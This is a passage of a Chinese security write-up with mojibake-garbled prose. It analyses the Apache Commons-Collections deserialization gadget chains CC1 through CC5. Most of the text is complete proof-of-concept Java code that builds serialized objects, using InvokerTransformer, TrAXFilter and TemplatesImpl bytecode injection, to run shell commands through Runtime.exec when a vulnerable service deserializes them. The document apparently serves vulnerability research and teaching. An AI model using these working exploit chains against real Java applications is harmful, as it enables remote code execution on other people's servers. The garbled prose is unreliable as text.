·çš„ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨åˆ°`newTransform`æ¥è°ƒç”¨ç›¸å…³å­—èŠ‚ç \n\nå‚è€ƒï¼š[Commons-Collections 1-7 åˆ©ç”¨é“¾åˆ†æ â€“ å¤©ä¸‹å¤§æœ¨å¤´ (wjlshare.com)](http://wjlshare.com/archives/1535)\n\n\n\n# ç»å…¸é“¾å­CITTN\n\n`ChainedTransformer->ConstantTransformer->InstantiateTransformer->TrAXFilter->TemplatesImpl`\n\nåŒæ ·ä¸ºäº†æ–¹ä¾¿è‡ªå·±å‘½åä¸º`CITTN`\n\n## æµ‹è¯•é“¾\n\nå³ç»“åˆä¹‹å‰æåˆ°çš„è¿™å‡ ä¸ªç±»ï¼Œä¹Ÿèƒ½æƒ³å‡ºç›¸å…³çš„é“¾å­ï¼Œç›¸å…³æµ‹è¯•å¦‚ä¸‹\n\n```java\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport javassist.*;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InstantiateTransformer;\n\nimport javax.xml.transform.Templates;\nimport java.lang.reflect.Field;\n\n\npublic class test {\n    public static void main(String[] args)  throws Exception {\n        ClassPool pool = ClassPool.getDefault();\n        pool.insertClassPath(String.valueOf(AbstractTranslet.class));\n        CtClass ctClass = pool.makeClass(\"test\");\n        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));\n        String code = \"{java.lang.Runtime.getRuntime().exec(\\\"touch bbbb\\\");}\";\n        ctClass.makeClassInitializer().insertAfter(code);\n        ctClass.setName(\"evil\");\n\n        byte[] classBytes = ctClass.toBytecode();\n        TemplatesImpl templates = TemplatesImpl.class.newInstance();\n        setField(templates, \"_bytecodes\", new byte[][]{classBytes});\n        setField(templates, \"_name\", \"name\");\n        setField(templates, \"_class\", null);\n\n        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {\n                new ConstantTransformer(TrAXFilter.class),\n                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})\n        });\n        chain.transform(\"test\");\n    }\n    public static void setField(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {\n        Field field = obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n}\n\n```\n\n## è§£æ\n\n![image-20220806110014361](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806110014361.png)\n\né¦–å…ˆè‡ªç„¶è¿˜æ˜¯`ChainedTransformer`ä¸­çš„æ•°ç»„è°ƒç”¨`transform`å‡½æ•°ï¼Œä¹‹åè°ƒç”¨`ConstantTransformer`çš„`transform`å‡½æ•°ï¼Œè·å–åˆ°`TrAXFilter`ç±»åï¼Œå†è°ƒç”¨`InstantiateTransformer`çš„`transform`å‡½æ•°ï¼Œå…¶ä¸­ä¼šç”Ÿæˆ`TrAXFilter`çš„å®ä¾‹åŒ–å¯¹è±¡\n\n![image-20220806112255293](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806112255293.png)\n\néšåå³å¯è¿›å…¥`TrAXFilter`çš„æ„é€ å‡½æ•°ï¼Œä¼ å…¥çš„`this.iArgs`å³ä¸ºå®ä¾‹åŒ–`InstantiateTransformer`æ—¶ä¼ å…¥çš„`Templates`å¯¹è±¡\n\n![image-20220806110523351](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806110523351.png)\n\nç„¶åå°±è°ƒç”¨åˆ°åˆ©ç”¨åå°„ä¸º`Templates`å¯¹è±¡å‡†å¤‡çš„å­—èŠ‚ç `_bytecodes`ï¼Œä»è€Œå®Œæˆä»»æ„å‡½æ•°æ‰§è¡Œã€‚\n\n\n\n# ä¸€ã€CC1\n\n## å‰ç½®çŸ¥è¯†\n\nä¸»è¦æ˜¯åŠ¨æ€ä»£ç†å¯¹è±¡çš„çŸ¥è¯†\n\nå‚è€ƒï¼š[Javaå®‰å…¨æ¼«è°ˆ - 11.ååºåˆ—åŒ–ç¯‡(5)](https://wx.zsxq.com/dweb2/index/topic_detail/118811585445582)\n\n### InvocationHandler\n\næœ‰ä¸€ä¸ªå’Œ`Transformer`æ¥å£å¾ˆåƒçš„ç±»`InvocationHandler`\n\n```java\npublic interface InvocationHandler {\n    public Object invoke(Object proxy, Method method, Object[] args)\n        throws Throwable;\n}\n```\n\nå½“è¯¥ä»£ç†å¯¹è±¡è°ƒç”¨ä»»æ„æ–¹æ³•æ—¶ï¼Œéƒ½ä¼šè¢«æ›¿æ¢ä¸ºè°ƒç”¨ä¹‹å‰ä¼ å…¥çš„å®ç°äº†`InvocationHandler`ç±»ä¸‹é‡å†™çš„`invoke`æ–¹æ³•ï¼Œä»¥ä¸‹æ˜¯ä¸ªç®€å•çš„ä¾‹å­ã€‚\n\n```java\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Proxy;\nimport java.util.HashMap;\nimport java.util.Map;\n\n\npublic class test {\n    public static void main(String[] args) {\n        //å£°æ˜ä¸€ä¸ªå®ç°äº†InvocationHandleræ¥å£çš„ç±»\n        class Demo implements InvocationHandler{\n            protected Map map;\n            public Demo(Map map){\n                this.map = map;\n            }\n            @Override\n            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n                System.out.println(\"Calling invoke....\");\n                if (method.getName().compareTo(\"get\") == 0){\n                    System.out.println(\"Hook method: \" + method.getName());\n                    return \"Hacked return string\";\n                }\n                return method.invoke(this.map,args);\n            }\n        }\n\n        InvocationHandler invocationHandler = new Demo(new HashMap());\n        //ä»£ç†æ—¶ä¼ å…¥å®ç°äº†InvocationHandleræ¥å£çš„ç±»çš„å®ä¾‹å¯¹è±¡,è¿”å›ä»£ç†å¯¹è±¡proxyMap\n        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},invocationHandler);\n        //å½“ä»£ç†å¯¹è±¡proxyMapè°ƒç”¨ä»»æ„æ–¹æ³•æ—¶,éƒ½ä¼šè¢«ä¹‹å‰ä¼ å…¥çš„å®ç°äº†\n        //InvocationHandleræ¥å£çš„ç±»ä¸‹é‡å†™çš„invokeæ–¹æ³•ç»™æ›¿æ¢æ‰\n        \n        //æ¯”å¦‚è¿™é‡Œçš„putå’Œgetéƒ½ä¼šè¢«Demo.invokeç»™æ›¿æ¢æ‰\n        proxyMap.put(\"hello\",\"world\");\n        String result = (String) proxyMap.get(\"hello\");\n        System.out.println(result);\n    }\n}\n```\n\né‚£ä¹ˆå°±æœ‰å¸Œæœ›è°ƒç”¨åˆ°æŸä¸ªç±»çš„`invoke`å‡½æ•°äº†ï¼Œè¿™é‡Œçš„`CC1`å³é€‰å–çš„å°è¯•è°ƒç”¨`AnnotationInvocationHandler.invoke()`\n\n## JAVAæºç ç‰ˆæœ¬-8u40\n\n![image-20220803181047725](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803181047725.png)\n\nç»†èŠ‚å¦‚ä¸‹ï¼š\n\n```\nAnnotationInvocationHandler.readObject()\nMap(Proxy).entrySet()\nAnnotationInvocationHandler.invoke()\nLazyMap.get()\nChainedTransformer.transform()\n```\n\n## é™åˆ¶\n\n`JDK`ç‰ˆæœ¬ï¼š`8u71`åŠä»¥å‰ç‰ˆæœ¬ï¼ŒåŸå› æ˜¯åœ¨`8u71`ä¹‹åçš„ç‰ˆæœ¬ä¸­`sun.reflect.annotation.AnnotationInvocationHandler.readObject()`å‡½æ•°å‘ç”Ÿäº†å˜åŒ–ã€‚\n\n## POC\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Map;\n\npublic class CC1 {\n    public static void main(String[] args) throws Exception{\n        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {\n            new ConstantTransformer(Runtime.class),\n            new InvokerTransformer(\"getMethod\", new Class[] {\n                String.class, Class[].class }, new Object[] {\n                \"getRuntime\", new Class[0] }),\n            new InvokerTransformer(\"invoke\", new Class[] {\n                Object.class, Object[].class }, new Object[] {\n                null, new Object[0] }),\n            new InvokerTransformer(\"exec\",\n                                   new Class[] { String.class }, new Object[]{\"touch aaaaa\"})});\n\n        HashMap innermap = new HashMap();\n        LazyMap map = (LazyMap) LazyMap.decorate(innermap,chain);\n\n        // åˆ›å»ºä¸€ä¸ªä¸ä»£ç†å¯¹è±¡ç›¸å…³è”çš„InvocationHandler map_handler\n        Constructor handler_constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class,Map.class);\n        handler_constructor.setAccessible(true);\n        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map);\n\n        // åˆ›å»ºä»£ç†å¯¹è±¡proxy_mapæ¥ä»£ç†map_handlerï¼Œä»£ç†å¯¹è±¡æ‰§è¡Œçš„æ‰€æœ‰æ–¹æ³•éƒ½ä¼šæ›¿æ¢æ‰§è¡ŒInvocationHandlerä¸­çš„invokeæ–¹æ³•\n        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler);\n\n        //å†åˆ›å»ºä¸€ä¸ªAnnotationInvocationHandlerå¯¹è±¡ï¼Œç”¨æ¥è§¦å‘ä»£ç†å¯¹è±¡proxy_mapçš„æ–¹æ³•æ‰§è¡Œ,ä»è€Œè·³è½¬AnnotationInvocationHandler.voker()\n        InvocationHandler handler = (InvocationHandler)handler_constructor.newInstance(Override.class,proxy_map);\n\n\n        try{\n            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc1\"));\n            outputStream.writeObject(handler);\n            outputStream.close();\n\n            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc1\"));\n            inputStream.readObject();\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n\n    }\n}\n```\n\n## è§£æ\n\n### `AnnotationInvocationHandler.readObject()`\n\n![image-20220803201921921](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803201921921.png)\n\n### `AnnotationInvocationHandler.invoke()`\n\n![image-20220803203105622](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803203105622.png)\n\n### `LazyMap.get()`\n\nè¿˜æ˜¯ç»å…¸çš„é“¾å­`CIR`\n\n![image-20220801110714702](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png)\n\n\n\n\n\n# äºŒã€CC2\n\n## JAVAæºç ç‰ˆæœ¬-8u40\n\n![image-20220805162929023](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805162929023.png)\n\nç»†èŠ‚å¦‚ä¸‹ï¼š\n\n```\nPriorityQueue.readObject()->heapify()->siftDown()->siftDownUsingComparator()\nTransformingComparator.compare()\nInvokerTransformer.transform()\nTemplateslmpl.newTransfomer()\n```\n\n`PriorityQueue`åœ¨`commons-collections4`ä¸‹æ‰å¼€å§‹æœ‰\n\n```xml\n<dependency>\n    <groupId>org.apache.commons</groupId>\n    <artifactId>commons-collections4</artifactId>\n    <version>4.0</version>\n</dependency>\n```\n\n## é™åˆ¶\n\n`JDK`ç‰ˆæœ¬ï¼šæš‚æ— \n\n## POC\n\n```java\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.util.PriorityQueue;\n\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\n\nimport javassist.ClassPool;\nimport javassist.CtClass;\n\nimport org.apache.commons.collections4.comparators.TransformingComparator;\nimport org.apache.commons.collections4.functors.InvokerTransformer;\n\npublic class CC2 {\n    public static void main(String[] args) throws Exception {\n        //æ„å»ºå­—èŠ‚ç \n        ClassPool pool = ClassPool.getDefault();\n        pool.insertClassPath(String.valueOf(AbstractTranslet.class));\n        CtClass ctClass = pool.makeClass(\"test\");\n        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));\n        String code = \"{java.lang.Runtime.getRuntime().exec(\\\"touch aaaa\\\");}\";\n        ctClass.makeClassInitializer().insertAfter(code);\n        ctClass.setName(\"evil\");\n\n        byte[] classBytes = ctClass.toBytecode();\n        TemplatesImpl templates = TemplatesImpl.class.newInstance();\n        setField(templates, \"_bytecodes\", new byte[][]{classBytes});\n        setField(templates, \"_name\", \"name\");\n        setField(templates, \"_class\", null);\n\n\n        Constructor constructor = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\")\n                .getDeclaredConstructor(String.class);\n        constructor.setAccessible(true);\n        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\");\n\n        TransformingComparator comparator = new TransformingComparator(transformer);\n        PriorityQueue queue = new PriorityQueue(1);\n\n        Object[] queue_array = new Object[]{templates,1};\n        setField(queue,\"queue\",queue_array);\n        setField(queue,\"size\",2);\n        //è®¾ç½®comparatorä¸ºTransformingComparator,è¿›å…¥siftDownUsingComparator\n        setField(queue,\"comparator\",comparator);\n\n        try{\n            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc2\"));\n            outputStream.writeObject(queue);\n            outputStream.close();\n\n            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc2\"));\n            inputStream.readObject();\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n\n    }\n\n    public static void setField(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {\n        Field field = obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n}\n```\n\n## è§£æ\n\n### `PriorityQueue.readObject()`\n\nè¿™é‡ŒåŒç†éœ€è¦çœ‹ä¸€ä¸‹`writeObject`å‡½æ•°\n\n![image-20220805165712958](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805165712958.png)\n\nä¹Ÿæ˜¯å¯¹åº”è¯»å†™çš„ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨åå°„è®¾ç½®`PriorityQueue`çš„`queue`ï¼Œä½¿å…¶å¯æ§ï¼Œç„¶åè¿›å…¥ä¸‹é¢çš„`heapify()`å‡½æ•°\n\n### `PriorityQueue.heapify()`\n\n![image-20220805170040301](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170040301.png)\n\nå†è¿›å…¥`siftDown`\n\n### `PriorityQueue.siftDown()`\n\nå…¶ä¸­`comparator`åˆ©ç”¨åå°„è®¾ç½®ä¸º`TransformingComparator`ï¼Œéšåè¿›å…¥`siftDownUsingComparator`å‡½æ•°\n\n![image-20220805170115164](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170115164.png)\n\n### `PriorityQueue.siftDownUsingComparator()`\n\nè°ƒç”¨åˆ°å®ç°äº†`Comparator`æ¥å£çš„`TransformingComparator.comparator()`å‡½æ•°\n\n![image-20220805170501655](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170501655.png)\n\n### `TransformingComparator.comparator()`\n\né‚£ä¹ˆä¹‹å‰åˆ©ç”¨åå°„è®¾ç½®äº†`TransformingComparator.transformer`ä¸º`InvokerTransformer`ï¼Œé‚£ä¹ˆå°±å¯ä»¥è°ƒç”¨åˆ°`InvokerTransformer.transoform`ï¼Œå¹¶ä¸”å…¶å‚æ•°å³ä¸ºè¿™é‡Œçš„`obj1`ï¼Œä¹Ÿä¸º`PriorityQueue.queue`ï¼Œè¿™ä¸ªä¹‹å‰è®¾ç½®ä¸ºäº†`TemplatesImpl`ï¼Œå³æœ€åå¯è°ƒç”¨åˆ°ç»å…¸é“¾å­`ITN`ï¼Œå®Œæˆåˆ©ç”¨ã€‚\n\n![image-20220805170750082](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170750082.png)\n\n\n\n\n\n\n\n\n\n# ä¸‰ã€CC3\n\n## JAVAæºç ç‰ˆæœ¬-8u40\n\n![image-20220806110944484](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806110944484.png)\n\nç»†èŠ‚å¦‚ä¸‹\n\n```\nAnnotationInvocationHandler.readObject()\nMap(Proxy).entrySet()\nAnnotationInvocationHandler.invoke()\nLazyMap.get()\nChainedTransformer.transform()\n```\n\nä¹‹åçš„é“¾å­å°±æ˜¯ç»å…¸`CITTN`é“¾äº†\n\n## é™åˆ¶\n\n`JDK`ç‰ˆæœ¬ï¼šæš‚æ— \n\n## POC\n\n```java\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport javassist.ClassClassPath;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InstantiateTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport javax.xml.transform.Templates;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.util.HashMap;\nimport java.util.Map;\n\n\npublic class CC3 {\n\n    public static void main(String[] args) throws Exception {\n        //æ„å»ºå­—èŠ‚ç \n        ClassPool pool = ClassPool.getDefault();\n        pool.insertClassPath(String.valueOf(AbstractTranslet.class));\n        CtClass ctClass = pool.makeClass(\"test\");\n        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));\n        String code = \"{java.lang.Runtime.getRuntime().exec(\\\"touch aaaa\\\");}\";\n        ctClass.makeClassInitializer().insertAfter(code);\n        ctClass.setName(\"evil\");\n\n        byte[] classBytes = ctClass.toBytecode();\n        TemplatesImpl templates = TemplatesImpl.class.newInstance();\n        setField(templates, \"_bytecodes\", new byte[][]{classBytes});\n        setField(templates, \"_name\", \"name\");\n        setField(templates, \"_class\", null);\n\n        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {\n            new ConstantTransformer(TrAXFilter.class),\n            new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})\n        });\n\n        HashMap innermap = new HashMap();\n        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);\n\n        // åˆ›å»ºä¸€ä¸ªä¸ä»£ç†å¯¹è±¡ç›¸å…³è”çš„InvocationHandler map_handler\n        Constructor handler_constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class,Map.class);\n        handler_constructor.setAccessible(true);\n        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map);\n\n        // åˆ›å»ºä»£ç†å¯¹è±¡proxy_mapæ¥ä»£ç†map_handlerï¼Œä»£ç†å¯¹è±¡æ‰§è¡Œçš„æ‰€æœ‰æ–¹æ³•éƒ½ä¼šæ›¿æ¢æ‰§è¡ŒInvocationHandlerä¸­çš„invokeæ–¹æ³•\n        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler);\n\n        //å†åˆ›å»ºä¸€ä¸ªAnnotationInvocationHandlerå¯¹è±¡ï¼Œç”¨æ¥è§¦å‘ä»£ç†å¯¹è±¡proxy_mapçš„æ–¹æ³•æ‰§è¡Œ,ä»è€Œè·³è½¬AnnotationInvocationHandler.voker()\n        InvocationHandler handler = (InvocationHandler)handler_constructor.newInstance(Override.class,proxy_map);\n\n        try{\n            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc3\"));\n            outputStream.writeObject(handler);\n            outputStream.close();\n\n            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc3\"));\n            inputStream.readObject();\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n\n    }\n\n    public static void setField(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {\n        Field field = obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n}\n```\n\n## è§£æ\n\nå³æŒ‰ç…§`CC1`çš„å‰åŠéƒ¨åˆ†é“¾å­åŠ ä¸Šç»å…¸çš„`CITTN`å³å¯ï¼Œä¸è¿‡å¤šèµ˜è¿°äº†\n\n\n\n\n\n# å››ã€CC4\n\n## JAVAæºç ç‰ˆæœ¬-8u40\n\n![image-20220807120904293](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807120904293.png)\n\nç»†èŠ‚å¦‚ä¸‹ï¼š\n\n```\nPriorityQueue.readObject()->heapify()->siftDown()->siftDownUsingComparator()\nTransformingComparator.compare()\nChainedTransformer.transform()\nInstantiateTransformer.transform()\nTrAXFilteræ„é€ å‡½æ•°\n```\n\n## é™åˆ¶\n\n`JDK`ç‰ˆæœ¬ï¼šæš‚æ— \n\n`PriorityQueue`åœ¨`commons-collections4`ä¸‹æ‰å¼€å§‹æœ‰\n\n```xml\n<dependency>\n    <groupId>org.apache.commons</groupId>\n    <artifactId>commons-collections4</artifactId>\n    <version>4.0</version>\n</dependency>\n```\n\n## POC\n\n```java\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport javassist.*;\nimport org.apache.commons.collections4.Transformer;\nimport org.apache.commons.collections4.functors.ChainedTransformer;\nimport org.apache.commons.collections4.functors.ConstantTransformer;\nimport org.apache.commons.collections4.functors.InstantiateTransformer;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\nimport javax.xml.transform.Templates;\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.util.PriorityQueue;\n\npublic class CC4 {\n    public static void main(String[] args) throws Exception {\n        //æ„å»ºå­—èŠ‚ç \n        ClassPool pool = ClassPool.getDefault();\n        pool.insertClassPath(String.valueOf(AbstractTranslet.class));\n        CtClass ctClass = pool.makeClass(\"test\");\n        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));\n        String code = \"{java.lang.Runtime.getRuntime().exec(\\\"touch aaaa\\\");}\";\n        ctClass.makeClassInitializer().insertAfter(code);\n        ctClass.setName(\"evil\");\n\n        byte[] classBytes = ctClass.toBytecode();\n        TemplatesImpl templates = TemplatesImpl.class.newInstance();\n        setField(templates, \"_bytecodes\", new byte[][]{classBytes});\n        setField(templates, \"_name\", \"name\");\n        setField(templates, \"_class\", null);\n\n\n        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {\n                new ConstantTransformer(TrAXFilter.class),\n                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})\n        });\n\n        TransformingComparator comparator = new TransformingComparator(chain);\n        PriorityQueue queue = new PriorityQueue();\n        //ä¸ç”¨è®¾ç½®PriorityQueue.queueä¸ºTemplatesImpl,å› ä¸ºTrAXFilteræ„é€ å‡½æ•°å¯ä»¥ç›´æ¥è§¦å‘\n        setField(queue,\"size\",2);\n        setField(queue,\"comparator\",comparator);\n\n\n        try{\n            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc4\"));\n            outputStream.writeObject(queue);\n            outputStream.close();\n\n            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc4\"));\n            inputStream.readObject();\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n    }\n\n\n\n    public static void setField(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {\n        Field field = obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n}\n```\n\n## è§£æ\n\næ„Ÿè§‰å’Œ`CC2`å·®ä¸å¤šï¼Œå°±æ˜¯åé¢çš„åˆ©ç”¨é“¾å­ï¼Œç”±äºæ˜¯`TrAXFilter`æ„é€ å‡½æ•°ç›´æ¥è§¦å‘çš„ï¼Œæ‰€ä»¥ä¸ç”¨è®¾ç½®`PriorityQueue.queue`ä¸º`TemplatesImpl`ï¼Œæ²¡æœ‰ä»€ä¹ˆå¤ªå¤šçš„äº®ç‚¹ã€‚\n\n# äº”ã€CC5\n\n## JAVAæºç ç‰ˆæœ¬-8u40\n\n![image-20220801095044379](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801095044379.png)\n\nç»†èŠ‚å¦‚ä¸‹\n\n```\nBadAttributeValueExpException.readObject()\nTiedMapEntry.toString()->getValue()\nLazyMap.get()\nChainedTransformer.transform()\n```\n\n## é™åˆ¶\n\n`JDK`ç‰ˆæœ¬ï¼šæš‚æ— \n\n## POC\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\n\nimport javax.management.BadAttributeValueExpException;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\n\npublic class CC5 {\n    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {\n        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[] {\n                        String.class, Class[].class }, new Object[] {\n                        \"getRuntime\", new Class[0] }),\n                new InvokerTransformer(\"invoke\", new Class[] {\n                        Object.class, Object[].class }, new Object[] {null, new Object[0] }),\n                new InvokerTransformer(\"exec\", new Class[] {\n                        String.class }, new Object[]{\"./test.sh\"})});\n        HashMap innermap = new HashMap();\n        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);\n        //è°ƒç”¨Getæ–¹æ³•\n        TiedMapEntry tiedmap = new TiedMapEntry(map,123);\n        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);\n        //BadAttributeValueExpException poc = new BadAttributeValueExpException(tiedmap);\n        Field val = Class.forName(\"javax.management.BadAttributeValueExpException\").getDeclaredField(\"val\");\n        val.setAccessible(true);\n        val.set(poc,tiedmap);\n\n        try{\n            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc5\"));\n            outputStream.writeObject(poc);\n            outputStream.close();\n\n            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc5\"));\n            inputStream.readObject();\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n\n\n## è§£æ\n\n### `BadAttributeValueExpException.readObject()`\n\n![image-20220801110613623](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110613623.png)\n\n`valObj`å³ä¸º`TiedMapEntry`\n\n### `TiedMapEntry.toString()->getValue()`\n\n![image-20220801110414584](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110414584.png)\n\nåç»­çš„`map`å³ä¸º`LazyMap`ï¼Œ`key`ä¸º`123`\n\n![image-20220801110428194](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110428194.png)\n\n### `LazyMap.get()`\n\nè¿˜æ˜¯ç»å…¸çš„é“¾å­`CIR`\n\n![image-20220801110714702](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png)\n\n\n\n## ğŸ”ºæ³¨\n\nåœ¨è®¾ç½®`BadAttributeValueExpException`å¯¹è±¡æ—¶ï¼Œä½¿ç”¨çš„æ˜¯å…¶ä¸­çš„`Field`æ¥è¿›è¡Œè®¾ç½®çš„\n\n```java\nBadAttributeValueExpException poc = new BadAttributeValueExpException(1);\nField val = Class.forName(\"javax.management.BadAttributeValueExpException\").getDeclaredField(\"val\");\nval.setAccessible(true);\nval.set(poc,tiedmap);\n```\n\nåŸå› åœ¨äºåœ¨`BadAttributeValueExpException`æ„é€ å‡½æ•°åŠ`readObject`å‡½æ•°ä¸­ï¼Œæœ‰å¦‚ä¸‹ä»£ç \n\n![image-20220801151544294](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801151544294.png)\n\nè¿™æ ·å°±èƒ½åœ¨åºåˆ—åŒ–æ—¶ä¸è¿›è¡Œæœ¬åœ°`RCE`ï¼Œè€Œåœ¨æœåŠ¡å™¨ååºåˆ—åŒ–æ—¶è¿›è¡Œ`RCE`ï¼Œå› 